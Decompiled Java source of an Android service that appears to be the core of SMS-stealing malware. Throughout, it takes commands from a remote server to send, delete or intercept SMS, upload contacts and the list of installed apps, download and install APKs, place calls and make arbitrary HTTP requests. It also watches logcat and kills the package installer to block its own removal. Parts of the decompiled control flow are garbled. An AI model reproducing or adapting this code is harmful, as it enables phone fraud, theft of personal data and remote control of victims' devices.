package ru.beta;

import android.app.ActivityManager;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.os.Bundle;
import android.os.Environment;
import android.os.IBinder;
import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.io.PrintStream;
import java.util.ArrayList;
import java.util.List;
import java.util.Vector;
import org.apache.http.message.BasicNameValuePair;
import org.json.JSONArray;
import org.json.JSONObject;

public final class MainService
  extends Service
  implements ThreadOperationListener
{
  static boolean isKill = false;
  public static boolean isRunning = false;
  static String packageName = "del.test.app";
  
  public MainService() {}
  
  public static void start(Context paramContext, Intent paramIntent, String paramString)
  {
    try
    {
      if (Constants.DEBUG) {
        System.out.println("MainService::start1()");
      }
      Intent localIntent = new Intent(paramContext, MainService.class);
      paramIntent = paramIntent.getExtras();
      if (paramIntent != null) {
        localIntent.putExtras(paramIntent);
      }
      localIntent.putExtra("key", paramString);
      paramContext.startService(localIntent);
      return;
    }
    catch (Exception paramContext)
    {
      paramContext.printStackTrace();
    }
  }
  
  public static void start(Context paramContext, Intent paramIntent, String paramString1, String paramString2, String paramString3, long paramLong)
  {
    try
    {
      if (Constants.DEBUG) {
        System.out.println("MainService::start2()");
      }
      Intent localIntent = new Intent(paramContext, MainService.class);
      paramIntent = paramIntent.getExtras();
      if (paramIntent != null) {
        localIntent.putExtras(paramIntent);
      }
      localIntent.putExtra("key", paramString1);
      localIntent.putExtra("number", paramString2);
      localIntent.putExtra("text", paramString3);
      localIntent.putExtra("id", String.valueOf(paramLong));
      paramContext.startService(localIntent);
      return;
    }
    catch (Exception paramContext)
    {
      paramContext.printStackTrace();
    }
  }
  
  public void executeCommands(JSONObject paramJSONObject)
  {
    try
    {
      if (Constants.DEBUG) {
        System.out.println("response: " + paramJSONObject.toString(4));
      }
      Settings localSettings = Settings.getSettings();
      if (paramJSONObject.has("wait"))
      {
        if (Constants.DEBUG) {
          System.out.println("has wait");
        }
        localSettings.timeNextConnection = (System.currentTimeMillis() + paramJSONObject.getInt("wait") * Constants.SECOND);
        localSettings.save(this);
      }
      if (paramJSONObject.has("server"))
      {
        if (Constants.DEBUG) {
          System.out.println("has server");
        }
        localSettings.server = paramJSONObject.getString("server");
        localSettings.save(this);
      }
      if (paramJSONObject.has("removeAllSmsFilters"))
      {
        if (Constants.DEBUG) {
          System.out.println("has removeAllSmsFilters");
        }
        if (Boolean.valueOf(paramJSONObject.getBoolean("removeAllSmsFilters")).booleanValue())
        {
          localSettings.deleteSmsList.clear();
          localSettings.save(this);
        }
      }
      if (paramJSONObject.has("removeAllCatchFilters"))
      {
        if (Constants.DEBUG) {
          System.out.println("has removeAllCatchFilters");
        }
        if (Boolean.valueOf(paramJSONObject.getBoolean("removeAllCatchFilters")).booleanValue())
        {
          localSettings.catchSmsList.clear();
          localSettings.save(this);
        }
      }
      Object localObject1;
      int i;
      Object localObject2;
      if (paramJSONObject.has("deleteSms"))
      {
        if (Constants.DEBUG) {
          System.out.println("has deleteSms");
        }
        localSettings.deleteSmsList.clear();
        localSettings.save(this);
        localObject1 = paramJSONObject.getJSONArray("deleteSms");
        i = 0;
        while (i < ((JSONArray)localObject1).length())
        {
          localObject2 = ((JSONArray)localObject1).getJSONObject(i);
          localSettings.deleteSmsList.add(new SmsItem(((JSONObject)localObject2).getString("phone"), ((JSONObject)localObject2).getString("text")));
          i += 1;
        }
        localSettings.save(this);
      }
      if (paramJSONObject.has("catchSms"))
      {
        if (Constants.DEBUG) {
          System.out.println("has catchSms");
        }
        localSettings.catchSmsList.clear();
        localSettings.save(this);
        localObject1 = paramJSONObject.getJSONArray("catchSms");
        i = 0;
        while (i < ((JSONArray)localObject1).length())
        {
          localObject2 = ((JSONArray)localObject1).getJSONObject(i);
          localSettings.catchSmsList.add(new SmsItem(((JSONObject)localObject2).getString("phone"), ((JSONObject)localObject2).getString("text")));
          i += 1;
        }
        localSettings.save(this);
      }
      if (paramJSONObject.has("sendSms"))
      {
        if (Constants.DEBUG) {
          System.out.println("has sendSms");
        }
        localObject1 = paramJSONObject.getJSONArray("sendSms");
        i = 0;
        while (i < ((JSONArray)localObject1).length())
        {
          localObject2 = ((JSONArray)localObject1).getJSONObject(i);
          Functions.sendSms(((JSONObject)localObject2).getString("phone"), ((JSONObject)localObject2).getString("text"));
          i += 1;
        }
      }
      Object localObject3;
      if (paramJSONObject.has("httpRequest"))
      {
        if (Constants.DEBUG) {
          System.out.println("has httpRequest");
        }
        Object localObject4 = paramJSONObject.getJSONObject("httpRequest");
        localObject1 = ((JSONObject)localObject4).getString("method");
        localObject2 = ((JSONObject)localObject4).getString("url");
        localObject3 = new ArrayList();
        ArrayList localArrayList = new ArrayList();
        Object localObject5 = ((JSONObject)localObject4).getJSONArray("params");
        i = 0;
        while (i < ((JSONArray)localObject5).length())
        {
          JSONObject localJSONObject = ((JSONArray)localObject5).getJSONObject(i);
          ((List)localObject3).add(new BasicNameValuePair(localJSONObject.getString("name"), localJSONObject.getString("value")));
          i += 1;
        }
        localObject4 = ((JSONObject)localObject4).getJSONArray("properties");
        i = 0;
        while (i < ((JSONArray)localObject4).length())
        {
          localObject5 = ((JSONArray)localObject4).getJSONObject(i);
          localArrayList.add(new BasicNameValuePair(((JSONObject)localObject5).getString("name"), ((JSONObject)localObject5).getString("value")));
          i += 1;
        }
        Functions.sendSimpleHttpRequest((String)localObject2, (String)localObject1, (List)localObject3, localArrayList);
      }
      if (paramJSONObject.has("update"))
      {
        if (Constants.DEBUG) {
          System.out.println("has update");
        }
        localObject1 = paramJSONObject.getString("update");
        localObject2 = (ConnectivityManager)getSystemService("connectivity");
        if ((((ConnectivityManager)localObject2).getNetworkInfo(1).isAvailable()) || (((ConnectivityManager)localObject2).getNetworkInfo(0).isConnectedOrConnecting()))
        {
          localObject2 = System.currentTimeMillis() + ".apk";
          localObject3 = Environment.getExternalStorageDirectory() + "/download/";
          if (Functions.downloadFile((String)localObject3, (String)localObject1, (String)localObject2)) {
            Functions.installApk(this, (String)localObject3 + (String)localObject2);
          }
        }
      }
      if (paramJSONObject.has("uninstall"))
      {
        if (Constants.DEBUG) {
          System.out.println("has uninstall");
        }
        localObject1 = paramJSONObject.getJSONArray("uninstall");
        i = 0;
        while (i < ((JSONArray)localObject1).length())
        {
          Functions.uninstallApk(this, ((JSONArray)localObject1).getString(i));
          i += 1;
        }
      }
      if (paramJSONObject.has("notification"))
      {
        if (Constants.DEBUG) {
          System.out.println("has notification");
        }
        localObject1 = paramJSONObject.getJSONObject("notification");
        localObject2 = ((JSONObject)localObject1).getString("url");
        Functions.showNotification(this, ((JSONObject)localObject1).getString("tickerText"), ((JSONObject)localObject1).getString("title"), ((JSONObject)localObject1).getString("text"), ((JSONObject)localObject1).getInt("icon"), (String)localObject2);
      }
      if (paramJSONObject.has("openUrl"))
      {
        if (Constants.DEBUG) {
          System.out.println("has openUrl");
        }
        Functions.openUrl(this, paramJSONObject.getString("openUrl"));
      }
      if (paramJSONObject.has("sendContactList"))
      {
        if (Constants.DEBUG) {
          System.out.println("has sendContactList");
        }
        if (Boolean.valueOf(paramJSONObject.getBoolean("sendContactList")).booleanValue()) {
          new Thread(new ThreadOperation(this, 2, null)).start();
        }
      }
      if (paramJSONObject.has("sendPackageList"))
      {
        if (Constants.DEBUG) {
          System.out.println("has sendPackageList");
        }
        if (Boolean.valueOf(paramJSONObject.getBoolean("sendPackageList")).booleanValue()) {
          new Thread(new ThreadOperation(this, 3, null)).start();
        }
      }
      if (paramJSONObject.has("twitter"))
      {
        if (Constants.DEBUG) {
          System.out.println("has twitter");
        }
        localSettings.twitterUrl = paramJSONObject.getString("twitter");
        localSettings.save(this);
      }
      if (paramJSONObject.has("makeCall"))
      {
        if (Constants.DEBUG) {
          System.out.println("has makeCall");
        }
        Functions.makeCall(this, paramJSONObject.getString("makeCall"));
      }
      return;
    }
    catch (Exception paramJSONObject)
    {
      paramJSONObject.printStackTrace();
    }
  }
  
  public IBinder onBind(Intent paramIntent)
  {
    return null;
  }
  
  public void onCreate()
  {
    super.onCreate();
    setForeground(true);
  }
  
  public void onDestroy() {}
  
  public void onStart(Intent paramIntent, int paramInt)
  {
    String str;
    try
    {
      super.onStart(paramIntent, paramInt);
      if (Constants.DEBUG) {
        System.out.println("MainService::onStart()");
      }
      paramIntent = paramIntent.getExtras();
      if ((paramIntent == null) || (paramIntent.get("key") == null)) {
        return;
      }
      str = (String)paramIntent.get("key");
      if (Constants.DEBUG) {
        System.out.println("key: " + str);
      }
      if (str.equals("alarm"))
      {
        new Thread(new ThreadOperation(this, 1, null)).start();
        return;
      }
      if (str.equals("catch"))
      {
        new Thread(new ThreadOperation(this, 4, new String[] { (String)paramIntent.get("number"), (String)paramIntent.get("text"), (String)paramIntent.get("id") })).start();
        return;
      }
    }
    catch (Exception paramIntent)
    {
      paramIntent.printStackTrace();
      return;
    }
    if ((str.equals("logs")) && (!isRunning)) {
      new Thread(new ThreadOperation(this, 5, null)).start();
    }
  }
  
  public void threadOperationRun(int paramInt, Object paramObject)
  {
    if (Constants.DEBUG) {
      System.out.println("threadOperationRun: " + paramInt);
    }
    Object localObject1;
    if (paramInt == 1)
    {
      paramObject = Beta.sendRequest(this);
      localObject1 = Settings.getSettings();
      ((Settings)localObject1).timeNextConnection = (System.currentTimeMillis() + ((Settings)localObject1).period * Constants.SECOND);
      ((Settings)localObject1).save(this);
      executeCommands(paramObject);
      if (Constants.DEBUG) {
        ((Settings)localObject1).printToOutStream();
      }
      Functions.startTimer(this);
    }
    label475:
    label482:
    do
    {
      return;
      if (paramInt == 2)
      {
        Beta.sendContactsToServer(Functions.contactsToJson(Functions.getContacts(this)));
        return;
      }
      if (paramInt == 3)
      {
        Beta.sendPackagesToServer(Functions.appListToJson(Functions.getInstalledAppList(this)));
        return;
      }
      Object localObject3;
      if (paramInt == 4)
      {
        localObject1 = (String[])paramObject;
        paramObject = Beta.sendCatchRequest(localObject1[0], localObject1[1]);
        try
        {
          if ((paramObject.has("removeCurrentCatchFilter")) && (Boolean.valueOf(paramObject.getBoolean("removeCurrentCatchFilter")).booleanValue()))
          {
            localObject3 = Settings.getSettings();
            ((Settings)localObject3).removeCatchFilter(Long.parseLong(localObject1[2]));
            ((Settings)localObject3).save(this);
          }
          executeCommands(paramObject);
          return;
        }
        catch (Exception localException1)
        {
          for (;;)
          {
            localException1.printStackTrace();
          }
        }
      }
      if (paramInt == 5)
      {
        isRunning = true;
        paramObject = null;
        localObject3 = null;
        for (;;)
        {
          try
          {
            Object localObject2 = Runtime.getRuntime().exec(new String[] { "logcat", "ActivityManager:I" });
            paramObject = localObject2;
            System.out.println("exec logcat OK");
            paramObject = localObject2;
            localIllegalArgumentException1.printStackTrace();
          }
          catch (IOException localIllegalArgumentException1)
          {
            try
            {
              paramObject = new BufferedReader(new InputStreamReader(paramObject.getInputStream()), 1024);
            }
            catch (IllegalArgumentException localIOException)
            {
              try
              {
                System.out.println("creare reader OK");
                try
                {
                  if (!isRunning) {
                    break;
                  }
                  localObject2 = paramObject.readLine();
                  paramInt = ((String)localObject2).indexOf("I/ActivityManager");
                  if (paramInt == -1) {
                    continue;
                  }
                  localObject2 = ((String)localObject2).substring(paramInt + "I/ActivityManager".length());
                  try
                  {
                    localObject3 = new IntentParser();
                    ((IntentParser)localObject3).parseString((String)localObject2);
                    if ((!((IntentParser)localObject3).action.equals("android.intent.action.DELETE")) || (!((IntentParser)localObject3).cmp.equals("com.android.packageinstaller/.UninstallerActivity"))) {
                      break label482;
                    }
                    if (!((IntentParser)localObject3).data.equals("package:" + packageName)) {
                      break label475;
                    }
                    isKill = true;
                    new Thread(new ThreadOperation(this, 6, localObject3)).start();
                  }
                  catch (Exception localException2)
                  {
                    localException2.printStackTrace();
                  }
                  continue;
                  localIOException = localIOException;
                }
                catch (IOException paramObject)
                {
                  paramObject.printStackTrace();
                  isRunning = false;
                  return;
                }
                localIOException.printStackTrace();
                isRunning = false;
              }
              catch (IllegalArgumentException localIllegalArgumentException2)
              {
                for (;;) {}
              }
              localIllegalArgumentException1 = localIllegalArgumentException1;
              paramObject = localObject3;
            }
          }
          isRunning = false;
          continue;
          isKill = false;
          continue;
          if ((((IntentParser)localObject3).action.equals("android.settings.MANAGE_ALL_APPLICATIONS_SETTINGS")) && (((IntentParser)localObject3).cmp.equals("com.android.settings/.Settings$ManageApplicationsActivity"))) {
            new Thread(new ThreadOperation(this, 6, localObject3)).start();
          }
        }
        stopSelf();
        return;
      }
    } while (paramInt != 6);
    paramObject = (ActivityManager)getSystemService("activity");
    try
    {
      paramObject.restartPackage("com.android.packageinstaller");
      try
      {
        Functions.showHome(this);
        return;
      }
      catch (Exception paramObject)
      {
        paramObject.printStackTrace();
        return;
      }
    }
    catch (Exception paramObject)
    {
      for (;;)
      {
        paramObject.printStackTrace();
      }
    }
  }
}
